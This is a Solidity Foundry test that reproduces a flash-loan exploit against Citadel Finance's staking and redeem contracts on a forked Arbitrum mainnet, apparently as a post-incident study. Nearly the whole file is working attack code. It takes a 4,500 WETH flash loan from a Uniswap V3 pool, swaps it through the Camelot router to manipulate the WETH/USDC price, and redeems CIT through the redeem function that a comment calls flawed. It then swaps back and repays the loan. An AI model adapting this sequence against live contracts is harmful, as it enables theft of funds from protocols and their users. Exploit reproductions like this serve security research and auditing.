// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./ICitadelStaking.sol";
import "./ICitadelRedeem.sol";
import "./ICamelotRouter.sol";

ICitadelStaking constant CitadelStaking = ICitadelStaking(
    0x5e93c07a22111b327EE0EaEC64028064448ae848
);
ICitadelRedeem constant CitadelRedeem = ICitadelRedeem(
    0x34b666992fcCe34669940ab6B017fE11e5750799
);
IUniswapV3Pool constant WETH_USDC = IUniswapV3Pool(
    0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443
);

WETH9 constant WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
IERC20 constant CIT = IERC20(0x43cF1856606df2CB22AEdbA1a3e23725f1594E81);

ICamelotRouter constant CamelotRouter = ICamelotRouter(
    payable(0xc873fEcbd354f5A56E00E710B90EF4201db2448d)
);
address constant citadelTreasury = 0x5ed32847e33844155c18944Ae84459404e432620;

contract CitadeFiananceTest is Test {
    function setUp() public {
        vm.createSelectFork("arb_one", 174659183);
        vm.label(address(CitadelStaking), "CitadelStaking");
        vm.label(address(CitadelRedeem), "CitadelRedeem");
        vm.label(address(WETH_USDC), "WETH_USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(CIT), "CIT");
        vm.label(address(CamelotRouter), "CamelotRouter");

        // Exploiter transfer to attack contract following amount of CIT:
        deal(address(CIT), address(this), 2_653 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // Approve CIT tokens to CitadelStaking contract:
        CIT.approve(address(CitadelStaking), CIT.balanceOf(address(this)));

        // Deposit all CIT tokens at fixed rate (1) to CitadelStaking contract:
        CitadelStaking.deposit(address(CIT), CIT.balanceOf(address(this)), 1);

        print(
            "Total staked CIT amount (minus fee) before",
            CitadelStaking.getTotalTokenStakedForUser(
                address(this),
                1,
                address(CIT)
            ),
            18
        );

        print("WETH balance before", WETH.balanceOf(address(this)), 18);

        vm.roll(174662726);
        vm.warp(block.timestamp + 15 minutes + 13 seconds);

        emit log_string("--------------------Start attack--------------------");
        // Start attack
        // Take WETH flashloan -> 4_500 WETH
        uint256 wethAmount = 4_500 ether;
        bytes memory data = abi.encode(wethAmount);
        WETH_USDC.flash(address(this), wethAmount, 0, data);

        print("WETH balance after", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        uint256 borrowedWETHAmount = abi.decode(data, (uint256));
        WETH.approve(address(CamelotRouter), borrowedWETHAmount);

        // Deposit borrowed WETH to WETH/USDC pair and swap to USDC (CamelotPair). Manipulate pool
        print(
            "Flashloaned amount of WETH to swap and manipulate WETH/USDC pair",
            borrowedWETHAmount,
            18
        );
        WETHToUSDC(borrowedWETHAmount);

        uint256 amountIn = WETH.balanceOf(citadelTreasury);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);

        uint256[] memory amounts = CamelotRouter.getAmountsOut(amountIn, path);
        uint256 amountOutUSDC = amounts[1];

        uint256 amountCITAvailable = CitadelStaking.redeemCalculator(
            address(this)
        )[0][1] + CitadelStaking.redeemCalculator(address(this))[1][1];

        print("Available amount of CIT to redeem", amountCITAvailable, 18);

        uint256 citInUSD = CitadelStaking.getCITInUSDAllFixedRates(
            address(this),
            amountCITAvailable
        );

        emit log_named_uint(
            "Available amount of CIT to redeem in USDC",
            citInUSD / 10 ** 12
        );

        uint256 redeemAmount = amountCITAvailable;
        if (amountOutUSDC < citInUSD / 10 ** 12) {
            redeemAmount = redeemAmount / 3;
        }

        // Flawed function. This function makes calculations based on state of WETH/USDC pair
        CitadelRedeem.redeem(1, 0, redeemAmount, 1);

        USDC.approve(address(CamelotRouter), USDC.balanceOf(address(this)));

        // Swap back from USDC to WETH
        USDCToWETH(USDC.balanceOf(address(this)));

        // Repaying flashloan
        WETH.transfer(address(WETH_USDC), borrowedWETHAmount + fee0);

        emit log_string("--------------------End attack--------------------");
    }

    function WETHToUSDC(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);

        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            address(0),
            block.timestamp + 1000
        );
    }

    function USDCToWETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);

        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            address(0),
            block.timestamp + 1000
        );
    }
}
